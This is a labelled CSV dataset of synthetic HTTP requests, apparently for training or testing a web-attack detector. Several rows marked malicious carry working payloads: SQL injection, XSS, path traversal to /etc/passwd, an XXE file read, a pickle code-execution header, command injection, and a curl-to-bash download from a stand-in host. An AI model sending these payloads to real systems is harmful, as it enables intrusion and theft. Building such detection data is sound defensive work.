label,text
benign,"POST /contact/feedback HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 1950
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://online-retail-store.biz/products/electronics
Connection: keep-alive
Cookie: sessionid=789xyz456abc1234def567; preference=currency%3DUSD

fullname=Bryan+M.+Stevens&email=bryan.ms123%40mailbox.com&subject=Order+Experience+Feedback&message=I+wanted+to+take+a+moment+to+express+my+gratitude+for+the+exceptional+service+provided+during+my+recent+purchase.+The+website+was+simple+to+navigate+and+the+filter+options+were+very+helpful+in+finding+the+exact+product+I+needed.+The+product+arrived+on+time%2C+and+the+packaging+was+done+with+care+to+prevent+any+damage+during+transit.+Inside%2C+everything+matched+the+online+description+and+images+accurately.+One+thing+I+particularly+appreciated+was+the+prompt+email+updates+about+shipping+status+which+helped+me+plan+my+schedule+accordingly.+Customer+service+representatives+were+also+responsive+and+friendly+when+I+had+a+question+about+warranty+coverage.+The+overall+experience+exceeded+my+expectations%2C+and+I+will+continue+to+shop+here+confidently."
benign,"HEAD /index.html HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Connection: keep-alive"
malicious,"GET /redirect?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: event-management-service.dev
User-Agent: Python-urllib/3.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0"
malicious,"GET /user/account HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Cookie: session_filter=(account=privileged%00;"
benign,"GET /files/education/intro_to_ai_overview.pdf HTTP/1.1
Host: nextgenlearning.edu
Accept: application/pdf
Referer: https://nextgenlearning.edu/courses/ai-basics
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Cache-Control: max-age=0"
benign,"GET /widgets/data-feed?limit=10&format=jsonp&callback=processData HTTP/1.1
Host: analytics-marketing-solutions.com
Connection: keep-alive
Accept: application/javascript
User-Agent: curl/7.85.0
Accept-Encoding: deflate, gzip"
benign,"POST /api/auth/request_reset HTTP/1.1
Host: cloud-data-services.ai
Content-Type: application/json
Accept: application/json
User-Agent: python-requests/2.28.1
X-CSRF-Token: e3f6dd72-5825-4c50-b457-12d5bbf5a9a1
Content-Length: 48
Connection: close

{""email"":""kai.lim@cloud-data-services.ai""}"
benign,"GET /info/update?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Mobile Safari/537.36
Accept: text/html
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
malicious,"GET /api/v2/search/9' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT CONCAT_WS(':',USER(),DATABASE())),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --/results HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.7
Referer: https://api.cloud-data-services.ai/search
User-Agent: Python-urllib/3.9"
malicious,"GET /content/load?file=../../../../../../../../etc/passwd HTTP/1.1
Host: enterprise-analytics-suite.co
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Connection: keep-alive"
benign,"GET /home HTTP/1.1
Host: discover-techhub.ai
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://discover-techhub.ai/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
benign,"POST /api/v1/shopping-cart/update HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Content-Type: application/json
Accept: application/json
Content-Length: 124
Cookie: cart_session=5b9e8ffa-9b9d-4b5d-8547-22122c9a8c77
Connection: keep-alive

{""cart_items_ids"":[""sku_8123"",""sku_4550"",""sku_2201""],""quantities"":[2,1,4],""coupon_code"":""SPRINGSALE2024"",""gift_wrap"":false}"
benign,"POST /account/update-info HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Cookie: session_id=59f4dc9e8a80c8a1bf3f1d32

first_name=Michael&last_name=&phone_number=+14151234567"
benign,"GET /images/logo.svg HTTP/1.1
Host: academic-journal-portal.edu
Accept: image/svg+xml,image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive"
benign,"POST /form/contact/submit HTTP/1.1
Host: community.healthcare-forum.org
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Content-Length: 33
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Referer: https://community.healthcare-forum.org/contact

{""UNION ALL"": ""request information""}"
benign,"POST /reports/quarterly/upload HTTP/1.1
Host: finance-and-accounting.co
Content-Type: text/csv
Content-Length: 101
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: text/csv
Connection: close

Quarter,Revenue,Expenses,Profit
Q1-2024,1000000,750000,250000
Q2-2024,1250000,800000,450000"
benign,"POST /beacon HTTP/1.1
Host: realtime-analytics.online-retail-store.biz
Origin: https://sales.online-retail-store.biz
Content-Type: text/plain
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Content-Length: 44

page=home&event=search&query=wireless+headphones"
benign,"GET /v3/items?nextPage=YzExNGRRb09MYXFSbA==&preferences=eyJjb2xvciI6ImJsdWUiLCJocmVuYWJsZSI6ZmFsc2V9 HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /products/search?q=wireless+noise+cancelling+headphones HTTP/1.1
Host: soundwave-electronics.tech
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html
Accept-Language: en-US,en;q=0.7
Referer: https://soundwave-electronics.tech/
Connection: keep-alive"
benign,"HEAD /index.html HTTP/1.1
Host: api.cloud-data-services.ai
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: close"
benign,"POST /api/v1/playlist/tracks/add HTTP/1.1
Host: music-streamer.online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Content-Length: 105
Cookie: user_session=7fa2ab6c-9f21-4e15-8984-e823cbf5dfa0
Connection: keep-alive

{""playlist_id"":""pl_2019_rock_classics"",""track_ids"":[""tr_98123"",""tr_98251"",""tr_98412"",""tr_98753""]}"
benign,"POST /api/v2/inventory/update HTTP/1.1
Host: supply-chain-solutions.tech
Content-Type: application/xml
Content-Length: 123
Accept-Encoding: gzip, deflate
User-Agent: curl/7.85.0
Authorization: Bearer mnbv8h7ysdf7654opuyt
Connection: close

<inventoryUpdate>
  <item>12345</item>
  <stock>67</stock>
  <warehouse>EastSide</warehouse>
</inventoryUpdate>"
benign,"GET /api/v1/fetchMetadata?url=https%3A%2F%2Fvirtual-events-hub.com%2Fevent%2F12345%2Fdetails HTTP/1.1
Host: api.virtual-events-hub.com
Accept: application/json
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept-Language: en-US
Connection: keep-alive
Via: 1.1 eventproxy-v2"
benign,"DELETE /api/v1/accounts/4321 HTTP/1.1
Host: service-catalogue.cloud-solutions.ai
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.afaksjdhfaksjdhf
If-Match: ""a1b2c3d4e5""
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive"
malicious,"GET /users?q=%26lt%3Bscript%26gt;alert&#x28;&#x27;XSS_%20Vulnerability_Found&#x27;&#x29;%26lt%3B%2fscript%26gt; HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Referer: https://secure-user-portal.net/dashboard
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15"
benign,"POST /v1/user/preferences/save HTTP/1.1
Host: pixelpulse-media.net
Content-Type: application/json
Accept: application/json
Origin: https://pixelpulse-media.net
X-Requested-With: FetchAPIClient
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9...TfN8
X-CSRF-Token: 9d5248a847e541169fcbac6e9baa2a56
Content-Length: 69

{""userId"":""78b32d"",""preferences"":{""theme"":""dark"",""fontSize"":14}}"
benign,"GET /profile/view?id=user_jackson_87 HTTP/1.1
Host: community.creative-codehub.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Cache-Control: max-age=0
Connection: close"
benign,"DELETE /api/v1/photos/3a5e4cbd HTTP/1.1
Host: creative-portfolio-site.org
Authorization: Bearer mktPLJ87SxuzHD039JjD
Accept: application/json
DNT: 1
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Connection: close"
benign,"POST /user/update HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer m7TrXoa28v9bhLLQ2u6Wkgd45JNTZpqk
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Content-Length: 100

{""username"":""travis89"",""email"":""travis89@secure-user-portal.net"",""isAdmin"":false,""profileVisibility"":""friends_only""}"
benign,"GET /blog/articles?category=technology&sort_by=date_desc&page=5 HTTP/1.1
Host: digital-insights-online.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml
Referer: https://digital-insights-online.info/blog
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
malicious,"POST /upload/processDocument HTTP/1.1
Host: enterprise-financial-tools.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/xml,text/html;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Origin: https://enterprise-financial-tools.co
Content-Type: multipart/form-data; boundary=----FinanceUploadBoundary2021
Content-Length: 393
Cookie: financeSession=207654acb9e107d45f2a45be80d2a7fb; Path=/; Secure; HttpOnly
Connection: keep-alive

------FinanceUploadBoundary2021
Content-Disposition: form-data; name=""description""

Quarterly financial configuration upload
------FinanceUploadBoundary2021
Content-Disposition: form-data; name=""configFile""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------FinanceUploadBoundary2021--"
malicious,"POST /auth/token/refresh HTTP/1.1
Host: secure-auth-service.auth-gateway.org
User-Agent: Python-requests/2.25.1
Accept: application/json, text/javascript
X-Payload-Pickle: \x80\x04\x95\x2b\x00\x00\x00\x00\x00\x00\x00cos\nbuiltins\neval\n\x94\x8c\x28__import__('os').system('id')\x94\x93\x94.\r
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

token=MTIzNDU2Nzg5&refresh=true"
benign,"GET /gallery/%EC%98%81%ED%99%94%EC%A7%80 HTTP/1.1
Host: world-cinema-archive.kr
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Connection: keep-alive"
benign,"POST /PaymentGateway/ProcessPayment HTTP/1.1
Host: payments.cloud-data-services.ai
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 322
Connection: close
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept-Language: en-US,en;q=0.5
Referer: https://billing.cloud-data-services.ai/dashboard

<?xml version=""1.0"" encoding=""UTF-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Body>
    <ProcessPaymentRequest xmlns=""http://cloud-data-services.ai/payments"">
      <Amount currency=""USD"">154.75</Amount>
      <CardNumber>4111111111111111</CardNumber>
      <CardExpiry>2025-11</CardExpiry>
      <CVV>123</CVV>
    </ProcessPaymentRequest>
  </soap:Body>
</soap:Envelope>"
benign,"POST /api/v2/photos/upload HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/8.2.1
Accept: */*
Content-Type: multipart/form-data; boundary=123456789abcdef
Content-Length: 352
Origin: https://api.cloud-data-services.ai
Cookie: session=plmn95286b3c89a9fa48a8b1043ef7902b
Connection: keep-alive

--123456789abcdef
Content-Disposition: form-data; name=""album_id""

74022
--123456789abcdef
Content-Disposition: form-data; name=""image_file""; filename=""vacation_beach.jpg""
Content-Type: image/jpeg

(simulated binary image data)
--123456789abcdef--"
benign,"GET /app/settings/profile?filter[type]=admin&filter[active]=true HTTP/1.1
Host: user-preferences.online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
DNT: 1"
malicious,"GET /service/data?user=alpha&filter_evil_chars=true&id=42&id=42%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: nextgen-remote-api.io
User-Agent: Python-urllib/3.9
Accept: application/json
Cache-Control: no-cache
Accept-Language: en-US
Referer: https://dashboard.nextgen-remote-api.io/home"
benign,"DELETE /api/v3/cart/items/4821 HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer mpa9IOlDqzWt7bxYW4PSrjeucROGTIxlfquah2JE
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Referer: https://online-retail-store.biz/cart/view
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/90.0.4430.212 Safari/537.36
Connection: close"
benign,"GET /robots.txt HTTP/1.1
Host: cloud-app-services.us
User-Agent: DataAnalyticsBot/0.9 (+http://dataanalyticsbot.cloud)
Accept-Encoding: gzip
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive"
malicious,"GET /monitoring/ping/server-east-2%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: analytics.edge-cloud-platform.io
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Language: en-US,en;q=0.5
Connection: close"
malicious,"GET /shop/cart/display HTTP/1.1
Host: urban-shop-network.co
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
Connection: close"
benign,"POST /chat/send HTTP/1.1
Host: community.laptop-helpdesk.ai
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/plain
Cookie: session_id=b73a9f7d429e1ad3
Content-Length: 28

message=/dance_move speedy_rotate"
malicious,"POST /api/v3/items/runCommand HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Content-Length: 126

{""command"":""/opt/maintenance/check.sh && curl http://payload-exfiltrate.net/exploit.sh | bash"",""user"":""operator"",""timestamp"":""2024-06-12T22:08:00Z""}"
benign,"GET /css/main-responsive.css HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
Accept: text/css,*/*;q=0.1
Referer: https://my-personal-blog-site.info/blog/article/view/123
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
benign,"POST /api/v1/booking/reservation HTTP/1.1
Host: reservations.greenvalley-travel.com
Content-Type: application/xml
Content-Length: 180
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/xml, text/plain
Connection: keep-alive

<ReservationRequest>
  <Customer>
    <FirstName>Laura</FirstName>
    <LastName>Mitchell</LastName>
  </Customer>
  <Trip>
    <Destination>Lake Tahoe</Destination>
    <DepartureDate>2024-07-18</DepartureDate>
    <ReturnDate>2024-07-25</ReturnDate>
  </Trip>
</ReservationRequest>"
benign,"GET /media/images/backgrounds?id=img_noonforest_001 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://my-personal-blog-site.info/blog/article/view/1972
Connection: keep-alive"
malicious,"POST /blog/article/view HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Sec-CH-UA: ""Firefox"";v=""89"", "" Not A;Brand"";v=""99"", ""Mozilla"";v=""5""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Linux""
Referer: https://my-personal-blog-site.info/home
Cache-Control: max-age=0

{
  ""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""
}"
